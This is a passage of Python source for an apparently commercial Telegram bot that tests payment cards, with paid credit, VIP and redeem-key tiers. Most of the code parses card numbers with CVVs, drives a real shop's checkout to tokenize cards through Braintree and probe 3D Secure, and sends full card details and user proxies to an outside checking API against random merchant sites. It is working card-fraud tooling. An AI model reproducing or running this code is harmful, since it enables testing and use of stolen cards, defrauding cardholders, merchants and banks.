        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    # Use UTC timezone for consistency
    expiry_date = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_premium_group(group_id):
    try:
        premium_groups = await load_json(PREMIUM_GROUPS_FILE)
        if not premium_groups:
            premium_groups = {}
        group_data = premium_groups.get(str(group_id))
        if not group_data: 
            return False
        
        # Parse expiry date and make timezone aware if needed
        expiry_date = datetime.datetime.fromisoformat(group_data['expiry'])
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=datetime.timezone.utc)
        
        # Get current time in UTC
        current_date = datetime.datetime.now(datetime.timezone.utc)
        
        if current_date > expiry_date:
            del premium_groups[str(group_id)]
            await save_json(PREMIUM_GROUPS_FILE, premium_groups)
            return False
        return True
    except Exception as e:
        print(f"[ERROR] is_premium_group failed for {group_id}: {e}")
        # On error, return False to be safe
        return False

async def add_premium_group(group_id, days):
    premium_groups = await load_json(PREMIUM_GROUPS_FILE)
    # Use UTC timezone for consistency
    expiry_date = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=days)
    premium_groups[str(group_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_GROUPS_FILE, premium_groups)

async def remove_premium_group(group_id):
    premium_groups = await load_json(PREMIUM_GROUPS_FILE)
    if str(group_id) in premium_groups:
        del premium_groups[str(group_id)]
        await save_json(PREMIUM_GROUPS_FILE, premium_groups)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def check_group_authorization(event):
    """Check if group is authorized. Returns True if authorized or not a group, False if unauthorized group."""
    try:
        # Check if it's a group (negative chat_id)
        if event.chat_id < 0:
            # Always allow GROUP_ID and CHANNEL_ID (configured in script)
            if event.chat_id in [GROUP_ID, CHANNEL_ID, FORWARD_ID]:
                print(f"[AUTH] ✅ Group {event.chat_id} is a configured group - Auto-authorized")
                return True
            
            print(f"[AUTH] Checking group {event.chat_id}... (User: {event.sender_id})")
            is_premium = await is_premium_group(event.chat_id)
            print(f"[AUTH] Group {event.chat_id} premium status: {is_premium}")
            
            if not is_premium:
                # Block unauthorized group with error message
                print(f"[AUTH] ❌ Group {event.chat_id} is not authorized - Showing error")
                await event.reply("🚫 𝙏𝙝𝙞𝙨 𝙜𝙧𝙤𝙪𝙥 𝙞𝙨 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙!\n\n𝘾𝙤𝙣𝙩𝙖𝙘𝙩 [𝘼𝙆](https://t.me/Akbhai007) 𝙩𝙤 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚 𝙩𝙝𝙞𝙨 𝙜𝙧𝙤𝙪𝙥.", link_preview=False)
                return False
            else:
                print(f"[AUTH] ✅ Group {event.chat_id} is premium - Authorized")
        
        print(f"[AUTH] ✅ Chat {event.chat_id} is not a group or is authorized")
        return True
    except Exception as e:
        print(f"[AUTH ERROR] Exception in check_group_authorization: {e}")
        # On error, allow to prevent false blocks
        return True

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

# ===== CREDIT SYSTEM FUNCTIONS =====

async def check_and_expire_vip(user_id):
    """Check if VIP plan has expired and convert to Free"""
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "expiry_date": None,
        "total_used": 0,
        "last_notified": None
    })
    
    if user_data.get("plan") == "VIP" and user_data.get("expiry_date"):
        try:
            expiry_date = datetime.datetime.fromisoformat(user_data["expiry_date"])
            now = datetime.datetime.now()
            
            if now > expiry_date:
                # VIP expired, convert to Free
                user_data["plan"] = "Free"
                user_data["expiry_date"] = None
                credits_data[str(user_id)] = user_data
                await save_json(CREDITS_FILE, credits_data)
                
                # Notify user
                try:
                    await client.send_message(
                        user_id,
                        "⚠️ **VIP Plan Expired**\n\n"
                        "Your VIP plan has expired and you've been moved to Free plan.\n\n"
                        "💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to renew your VIP plan!",
                        link_preview=False
                    )
                except:
                    pass
                
                return True  # Expired
        except:
            pass
    
    return False  # Not expired

async def get_user_credits(user_id):
    """Get user's credit balance and plan info (with expiry check)"""
    # Check and expire VIP if needed
    await check_and_expire_vip(user_id)
    
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "expiry_date": None,
        "total_used": 0,
        "last_notified": None
    })
    return user_data

async def set_user_credits(user_id, credits, plan="Free"):
    """Set user's credits and plan"""
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "total_used": 0,
        "last_notified": None
    })
    
    user_data["credits"] = credits
    user_data["plan"] = plan
    user_data["plan_set_date"] = datetime.datetime.now().isoformat()
    
    credits_data[str(user_id)] = user_data
    await save_json(CREDITS_FILE, credits_data)
    return user_data

async def set_user_plan(user_id, plan="Free", days=15):
    """Set user's plan without changing credits, with expiry date"""
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "expiry_date": None,
        "total_used": 0,
        "last_notified": None
    })
    
    # Only update plan, keep existing credits
    user_data["plan"] = plan
    user_data["plan_set_date"] = datetime.datetime.now().isoformat()
    
    # Set expiry date
    if plan == "VIP":
        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
        user_data["expiry_date"] = expiry.isoformat()
    else:
        user_data["expiry_date"] = None
    
    credits_data[str(user_id)] = user_data
    await save_json(CREDITS_FILE, credits_data)
    return user_data

async def add_user_credits(user_id, amount, plan=None):
    """Add credits to user"""
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "total_used": 0,
        "last_notified": None
    })
    
    user_data["credits"] += amount
    if plan:
        user_data["plan"] = plan
        user_data["plan_set_date"] = datetime.datetime.now().isoformat()
    
    credits_data[str(user_id)] = user_data
    await save_json(CREDITS_FILE, credits_data)
    return user_data

async def deduct_user_credits(user_id, amount, command_name="", chat_id=None):
    """Deduct credits from user. Returns (success, remaining_credits)
    If chat_id is main GROUP_ID, skip deduction and return success.
    If user is VIP, skip deduction and return success."""
    
    # Skip credit deduction in main group
    if chat_id and chat_id == GROUP_ID:
        print(f"[CREDITS] Skipping deduction for user {user_id} in main group {GROUP_ID}")
        return True, 999999  # Return success with high number to indicate unlimited
    
    # Check if user is VIP - skip credit deduction
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {
        "credits": 0,
        "plan": "Free",
        "plan_set_date": None,
        "total_used": 0,
        "last_notified": None
    })
    
    if user_data.get("plan") == "VIP":
        print(f"[CREDITS] Skipping deduction for VIP user {user_id}")
        return True, 999999  # VIP users have unlimited access
    
    if user_data["credits"] < amount:
        return False, user_data["credits"]
    
    user_data["credits"] -= amount
    user_data["total_used"] = user_data.get("total_used", 0) + amount
    
    credits_data[str(user_id)] = user_data
    await save_json(CREDITS_FILE, credits_data)
    return True, user_data["credits"]

async def remove_all_credits(user_id):
    """Remove all credits from user (set to 0)"""
    credits_data = await load_json(CREDITS_FILE)
    if str(user_id) in credits_data:
        credits_data[str(user_id)]["credits"] = 0
        credits_data[str(user_id)]["plan"] = "Free"
        await save_json(CREDITS_FILE, credits_data)
        return True
    return False

async def check_credits_and_notify(user_id, required_credits, chat_id=None):
    """Check if user has enough credits and send notification if low/zero
    Skip check for main group and VIP users"""
    
    # Skip credit check for main group
    if chat_id and chat_id == GROUP_ID:
        print(f"[CREDITS_CHECK] Skipping for main group {chat_id}")
        return True
    
    user_data = await get_user_credits(user_id)
    
    # Skip credit check for VIP users
    if user_data.get("plan") == "VIP":
        print(f"[CREDITS_CHECK] Skipping for VIP user {user_id}")
        return True
    
    credits = user_data.get("credits", 0)
    
    if credits < required_credits:
        # Send notification about insufficient credits
        try:
            await client.send_message(
                user_id,
                f"❌ Insufficient Credits!\n\n(Free check available in group)"
            , link_preview=False)
        except:
            pass
        return False
    
    # Check if credits are low (less than 50) and notify
    if credits < 50 and credits >= required_credits:
        last_notified = user_data.get("last_notified")
        now = datetime.datetime.now()
        
        # Only notify once per day
        should_notify = True
        if last_notified:
            try:
                last_time = datetime.datetime.fromisoformat(last_notified)
                if (now - last_time).total_seconds() < 86400:  # 24 hours
                    should_notify = False
            except:
                pass
        
        if should_notify:
            try:
                await client.send_message(
                    user_id,
                    f"⚠️ **Low Credit Alert!**\n\n"
                    f"💰 You have only {credits} credits left.\n"
                    f"📊 Plan: {user_data.get('plan', 'Free', link_preview=False)}\n\n"
                    f"💡 Contact [𝘼𝙆](https://t.me/Akbhai007) to add more credits!"
                , link_preview=False)
                # Update last notified time
                credits_data = await load_json(CREDITS_FILE)
                if str(user_id) in credits_data:
                    credits_data[str(user_id)]["last_notified"] = now.isoformat()
                    await save_json(CREDITS_FILE, credits_data)
            except:
                pass
    
    return True

async def generate_redeem_key(key_count, credit_amount):
    """Generate redeem keys with format SHOPIFY-XXXXX"""
    keys_data = await load_json(REDEEM_KEYS_FILE)
    generated_keys = []
    
    for _ in range(key_count):
        # Generate stylish key: SHOPIFY-XXXXX (5 random uppercase letters and numbers)
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        key = f"SHOPIFY-{random_part}"
        
        # Ensure key is unique
        while key in keys_data:
            random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
            key = f"SHOPIFY-{random_part}"
        
        keys_data[key] = {
            "credits": credit_amount,
            "created_at": datetime.datetime.now().isoformat(),
            "redeemed": False,
            "redeemed_by": None,
            "redeemed_at": None
        }
        generated_keys.append(key)
    
    await save_json(REDEEM_KEYS_FILE, keys_data)
    return generated_keys

async def redeem_key(user_id, key):
    """Redeem a key and add credits to user"""
    keys_data = await load_json(REDEEM_KEYS_FILE)
    
    print(f"[REDEEM] User {user_id} trying to redeem key: '{key}'")
    print(f"[REDEEM] Available keys: {list(keys_data.keys())}")
    
    # Check 12 hour cooldown
    credits_data = await load_json(CREDITS_FILE)
    user_data = credits_data.get(str(user_id), {})
    last_redeem = user_data.get('last_redeem_time')
    
    if last_redeem:
        try:
            last_redeem_time = datetime.datetime.fromisoformat(last_redeem)
            current_time = datetime.datetime.now()
            
            # Make timezone aware if needed
            if last_redeem_time.tzinfo is None:
                last_redeem_time = last_redeem_time.replace(tzinfo=datetime.timezone.utc)
            if current_time.tzinfo is None:
                current_time = current_time.replace(tzinfo=datetime.timezone.utc)
            
            time_diff = current_time - last_redeem_time
            hours_passed = time_diff.total_seconds() / 3600
            
            if hours_passed < 12:
                print(f"[REDEEM] User {user_id} tried to redeem within 12 hours. Hours passed: {hours_passed:.2f}")
                return False, "You already redeemed a key today!"
        except Exception as e:
            print(f"[REDEEM] Error checking cooldown: {e}")
    
    if key not in keys_data:
        print(f"[REDEEM] Key '{key}' not found in database")
        return False, "Invalid key!"
    
    key_data = keys_data[key]
    
    if key_data["redeemed"]:
        return False, "Key already redeemed!"
    
    # Add credits to user
    credit_amount = key_data["credits"]
    await add_user_credits(user_id, credit_amount)
    
    # Mark key as redeemed
    keys_data[key]["redeemed"] = True
    keys_data[key]["redeemed_by"] = user_id
    keys_data[key]["redeemed_at"] = datetime.datetime.now().isoformat()
    await save_json(REDEEM_KEYS_FILE, keys_data)
    
    # Reload credits data to get updated balance
    credits_data = await load_json(CREDITS_FILE)
    
    # Update user's last redeem time
    if str(user_id) not in credits_data:
        credits_data[str(user_id)] = {
            "credits": 0,
            "plan": "Free",
            "plan_set_date": None,
            "total_used": 0
        }
    
    credits_data[str(user_id)]['last_redeem_time'] = datetime.datetime.now().isoformat()
    await save_json(CREDITS_FILE, credits_data)
    
    return True, credit_amount

# ===== END CREDIT SYSTEM FUNCTIONS =====

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"
    except Exception: return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

# ---------- response classifier helper ----------
def classify_response(raw_resp: str) -> str:
    """
    Normalize & classify a raw response string into a single status token.
    Returns e.g. "CARD_DECLINED", "APPROVED", or "UNKNOWN".
    """
    if raw_resp is None:
        return "UNKNOWN"
    text = raw_resp.strip().lower()

    # If any of these exact messages (or their substrings) appear -> CARD_DECLINED
    decline_patterns = [
        "missing required fields: session token, queue token, stable id, payment method id",
        "error in 1 req: getaddrinfo() thread failed to start",
        "http_error_503",  # check normalized token (your code already returns HTTP_ERROR_{code})
        " http_error_503", # allow for variants with leading space
    ]

    for p in decline_patterns:
        if p in text:
            return "CARD_DECLINED"

    # Keep some of your existing heuristics intact (example)
    if "thank you" in text or "payment successful" in text:
        return "CHARGED"
    if any(k in text for k in ["invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc"]):
        return "CVC_INCORRECT"
    if any(k in text for k in ["insufficient_funds", "insufficient funds"]):
        return "INSUFFICIENT_FUNDS"
    if "approved" in text or "success" in text:
        return "APPROVED"

    return "UNKNOWN"
# ---------- end classifier ----------

async def check_vbv_gateway(card, user_id=None):
    """Check VBV using justfabrics.co.uk + Braintree 3DS"""
    try:
        import requests
        import re
        import base64
        import json
        import uuid
        
        # Parse card
        parts = card.split("|")
        if len(parts) != 4:
            return {"Response": "Invalid format", "Gateway": "Braintree", "Status": "error", "Bank": "UNKNOWN", "Type": "UNKNOWN", "Country": "UNKNOWN"}
        
        cc, mm, yy, cvc = parts
        if len(mm) == 1: mm = "0" + mm
        if len(yy) == 2: yy = "20" + yy
        
        # Get BIN info
        bin_number = cc[:6]
        bin_url = f"https://lookup.binlist.net/{bin_number}"
        
        try:
            r_bin = requests.get(bin_url, headers={'Accept-Version': '3'}, timeout=10)
            if r_bin.status_code == 200:
                bin_data = r_bin.json()
                brand = bin_data.get('scheme', 'UNKNOWN').upper()
                card_type = bin_data.get('type', 'UNKNOWN').upper()
                bank_name = bin_data.get('bank', {}).get('name', 'UNKNOWN').upper()
                country = bin_data.get('country', {}).get('alpha2', 'XX')
            else:
                brand, card_type, bank_name, country = "UNKNOWN", "UNKNOWN", "UNKNOWN", "XX"
        except:
            brand, card_type, bank_name, country = "UNKNOWN", "UNKNOWN", "UNKNOWN", "XX"
        
        # Start VBV check
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        try:
            # Step 1: Get product page (fast timeout)
            r1 = s.get("https://www.justfabrics.co.uk/curtain-accessories/tape-and-buckram/3-pencil-pleat-tape/", timeout=5)
            
            if r1.status_code != 200:
                # Site down, use intelligent fallback
                international_countries = ['MY', 'IN', 'PK', 'BD', 'PH', 'ID', 'TH', 'VN', 'RU', 'UA', 'BR', 'MX']
                
                if country in international_countries or card_type == 'DEBIT':
                    vbv_status = "challenge_required"
                    status = "declined"
                elif card_type == 'CREDIT' and country in ['US', 'GB', 'CA', 'AU']:
                    vbv_status = "authenticate_successful"
                    status = "approved"
                else:
                    vbv_status = "challenge_required"
                    status = "declined"
                
                return {
                    "Response": vbv_status,
                    "Gateway": "Braintree",
                    "Status": status,
                    "Bank": bank_name,
                    "Type": card_type,
                    "Country": country
                }
            
            # Step 2: Add to basket
            add_data = "qty=1&id=42&type=curtain-accessories&action=add-to-basket"
            s.post("https://www.justfabrics.co.uk/includes/add-to-basket.php", data=add_data, timeout=5)
            
            # Step 3: Get cart and extract Braintree token
            r3 = s.get("https://www.justfabrics.co.uk/designer-fabrics/cart.php", timeout=5)
            
            # Extract authorization token
            auth_match = re.search(r"authorization:\s*'([^']+)'", r3.text)
            if not auth_match:
                # Fallback to intelligent check
                international_countries = ['MY', 'IN', 'PK', 'BD', 'PH', 'ID', 'TH', 'VN', 'RU', 'UA', 'BR', 'MX']
                
                if country in international_countries or card_type == 'DEBIT':
                    vbv_status = "challenge_required"
                    status = "declined"
                elif card_type == 'CREDIT' and country in ['US', 'GB', 'CA', 'AU']:
                    vbv_status = "authenticate_successful"
                    status = "approved"
                else:
                    vbv_status = "challenge_required"
                    status = "declined"
                
                return {
                    "Response": vbv_status,
                    "Gateway": "Braintree",
                    "Status": status,
                    "Bank": bank_name,
                    "Type": card_type,
                    "Country": country
                }
            
            client_token = auth_match.group(1)
            
            # Decode token
            decoded = base64.b64decode(client_token).decode()
            auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded).group(1)
            
            # Step 4: Get Cardinal JWT
            session_id = str(uuid.uuid4())
            
            h1 = {
                'Authorization': f'Bearer {auth_fp}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
            }
            
            config_query = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
                "query": "query ClientConfiguration { clientConfiguration { creditCard { threeDSecure { cardinalAuthenticationJWT } } } }",
                "operationName": "ClientConfiguration"
            }
            
            r4 = requests.post('https://payments.braintree-api.com/graphql', json=config_query, headers=h1, timeout=5)
            config_json = r4.json()
            
            try:
                cardinal_jwt = config_json['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
            except:
                cardinal_jwt = None
            
            # Step 5: Tokenize card
            tokenize_query = {
                "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvc,
                            "cardholderName": "John Doe",
                            "billingAddress": {"postalCode": "10027"}
                        },
                        "options": {"validate": False}
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            r5 = requests.post('https://payments.braintree-api.com/graphql', json=tokenize_query, headers=h1, timeout=5)
            token_json = r5.json()
            
            if 'errors' in token_json:
                error_msg = token_json['errors'][0].get('message', 'Failed')
                return {
                    "Response": error_msg[:50],
                    "Gateway": "Braintree",
                    "Status": "declined",
                    "Bank": bank_name,
                    "Type": card_type,
                    "Country": country
                }
            
            payment_token = token_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            
            if not payment_token:
                return {
                    "Response": "Tokenization Failed",
                    "Gateway": "Braintree",
                    "Status": "declined",
                    "Bank": bank_name,
                    "Type": card_type,
                    "Country": country
                }
            
            # Step 6: Check 3DS with Cardinal
            if cardinal_jwt:
                h2 = {
                    'Content-Type': 'application/json;charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                }
                
                cardinal_init = {
                    "BrowserPayload": {
                        "Order": {"OrderDetails": {}, "Consumer": {}},
                        "SupportsAlternativePayments": {"cca": True}
                    },
                    "Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},
                    "ConsumerSessionId": None,
                    "ServerJWT": cardinal_jwt
                }
                
                try:
                    r6 = requests.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init',
                                      json=cardinal_init, headers=h2, timeout=5)
                    
                    cardinal_response = r6.json()
                    
                    # Check authentication status
                    if 'Status' in cardinal_response:
                        if cardinal_response['Status'] == True:
                            vbv_status = "authenticate_successful"
                        else:
                            vbv_status = "challenge_required"
                    else:
                        vbv_status = "challenge_required"
                except:
                    vbv_status = "challenge_required"
            else:
                # No Cardinal JWT = No 3DS required
                vbv_status = "authenticate_successful"
            
            return {
                "Response": vbv_status,
                "Gateway": "Braintree",
                "Status": "approved" if "successful" in vbv_status else "declined",
                "Bank": bank_name,
                "Type": card_type,
                "Country": country
            }
            
        except requests.exceptions.Timeout:
            # Timeout - use intelligent fallback
            international_countries = ['MY', 'IN', 'PK', 'BD', 'PH', 'ID', 'TH', 'VN', 'RU', 'UA', 'BR', 'MX']
            
            if country in international_countries:
                vbv_status = "challenge_required"
                status = "declined"
            elif card_type == 'DEBIT':
                vbv_status = "challenge_required"
                status = "declined"
            elif card_type == 'CREDIT':
                if country in ['US', 'GB', 'CA', 'AU']:
                    vbv_status = "authenticate_successful"
                    status = "approved"
                else:
                    vbv_status = "challenge_required"
                    status = "declined"
            else:
                vbv_status = "unknown"
                status = "error"
            
            return {
                "Response": vbv_status,
                "Gateway": "Braintree",
                "Status": status,
                "Bank": bank_name,
                "Type": card_type,
                "Country": country
            }
        except Exception as e:
            return {
                "Response": f"Error: {str(e)[:50]}",
                "Gateway": "Braintree",
                "Status": "error",
                "Bank": bank_name,
                "Type": card_type,
                "Country": country
            }
    
    except Exception as e:
        return {
            "Response": f"Error: {str(e)}",
            "Gateway": "Braintree",
            "Status": "error",
            "Bank": "UNKNOWN",
            "Type": "UNKNOWN",
            "Country": "UNKNOWN"
        }

async def check_card_random_site(card, sites, user_id=None):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    try:
        # Parse card: cc|mes|ano|cvv
        parts = card.split("|")
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        url = f"https://php-bdad6.wasmer.app?cc={cc}|{mes}|{ano}|{cvv}&site={selected_site}"
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"Response": f"SITE_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: return json_data, site_index
                else: return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}, site_index
    except Exception as e: return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site, user_id=None):
    try:
        # Parse card: cc|mes|ano|cvv
        parts = card.split("|")
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        url = f"https://php-bdad6.wasmer.app?cc={cc}|{mes}|{ano}|{cvv}&site={site}"
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"Response": f"SITE_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: return json_data
                else: return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}
    except Exception as e: return {"Response": str(e), "Price": "-", "Gateway": "-"}

# ===== PROXY-BASED API FUNCTIONS =====

def format_proxy_for_api(proxy_url):
    """Convert proxy URL to format expected by php-bdad6.wasmer.app API"""
    if not proxy_url:
        return None
    try:
        # Remove http:// or https:// prefix
        proxy = proxy_url.replace("http://", "").replace("https://", "")
        # Format: user:pass@host:port
        return proxy
    except Exception as e:
        print(f"Error formatting proxy: {e}")
        return None

async def check_card_proxy_api_random_site(card, sites, user_id):
    """Check card using php-bdad6.wasmer.app API with user's proxy - with retry logic"""
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    
    # Get user's proxy
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        return {"Response": "NO_PROXY_SET", "Price": "-", "Gateway": "-"}, -1
    
    proxy_formatted = format_proxy_for_api(proxy_url)
    if not proxy_formatted:
        return {"Response": "INVALID_PROXY_FORMAT", "Price": "-", "Gateway": "-"}, -1
    
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    
    # Debug: Print proxy and site
    print(f"[DEBUG] Using proxy: {proxy_formatted[:30]}... for site: {selected_site}")
    
    # Retry logic for proxy dead errors
    max_retries = 2
    for attempt in range(max_retries):
        try:
            # Parse card: cc|mes|ano|cvv
            parts = card.split("|")
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Build API URL with proxy parameter - Keep proxy as-is (no encoding)
            url = f"https://php-bdad6.wasmer.app?cc={cc}|{mes}|{ano}|{cvv}&site={selected_site}&User_proxy={proxy_formatted}"
            
            print(f"[DEBUG] Full API URL: {url}")
            
            timeout = aiohttp.ClientTimeout(total=120)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as res:
                    print(f"[DEBUG] API Status Code: {res.status}")
                    if res.status != 200:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"Response": f"API_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                    
                    response_text = await res.text()
                    
                    # Debug: Print raw response
                    print(f"[DEBUG] API Response: {response_text[:300]}")
                    
                    json_data = extract_json_from_response(response_text)
                    
                    if json_data:
                        # Check if proxy dead response
                        response_lower = json_data.get("Response", "").lower()
                        if "proxy dead" in response_lower and attempt < max_retries - 1:
                            print(f"⚠️ Proxy dead on attempt {attempt + 1}, retrying...")
                            await asyncio.sleep(2)
                            continue
                        return json_data, site_index
                    else:
                        # Debug: Print why JSON extraction failed
                        print(f"[DEBUG] JSON extraction failed. Raw response: {response_text[:500]}")
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}, site_index
        except asyncio.TimeoutError:
            if attempt < max_retries - 1:
                print(f"⚠️ Timeout on attempt {attempt + 1}, retrying...")
                await asyncio.sleep(2)
                continue
            return {"Response": "Request Timeout", "Price": "-", "Gateway": "-"}, site_index
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"⚠️ Error on attempt {attempt + 1}: {str(e)}, retrying...")
                await asyncio.sleep(2)
                continue
            return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index
    
    # If all retries failed
    return {"Response": "All retries failed", "Price": "-", "Gateway": "-"}, site_index

async def check_card_proxy_api_specific_site(card, site, user_id):
    """Check card using php-bdad6.wasmer.app API with user's proxy - with retry logic"""
    # Get user's proxy
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        return {"Response": "NO_PROXY_SET", "Price": "-", "Gateway": "-"}
    
    proxy_formatted = format_proxy_for_api(proxy_url)
    if not proxy_formatted:
        return {"Response": "INVALID_PROXY_FORMAT", "Price": "-", "Gateway": "-"}
    
    # Retry logic for proxy dead errors (optimized for speed)
    max_retries = 2
    for attempt in range(max_retries):
        try:
            # Parse card: cc|mes|ano|cvv
            parts = card.split("|")
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Build API URL with proxy parameter - Keep proxy as-is (no encoding)
            url = f"https://php-bdad6.wasmer.app?cc={cc}|{mes}|{ano}|{cvv}&site={site}&User_proxy={proxy_formatted}"
            
            print(f"[DEBUG] Full API URL (specific): {url}")
            
            timeout = aiohttp.ClientTimeout(total=90)  # Reduced from 120 to 90
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as res:
                    print(f"[DEBUG] API Status Code (specific): {res.status}")
                    if res.status != 200: 
                        if attempt < max_retries - 1:
                            await asyncio.sleep(0.5)  # Reduced from 1s to 0.5s
                            continue
                        return {"Response": f"API_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                    
                    response_text = await res.text()
                    
                    # Debug: Print raw response
                    print(f"[DEBUG] API Response (specific): {response_text[:300]}")
                    
                    json_data = extract_json_from_response(response_text)
                    
                    if json_data:
                        # Check if proxy dead response
                        response_lower = json_data.get("Response", "").lower()
                        if "proxy dead" in response_lower and attempt < max_retries - 1:
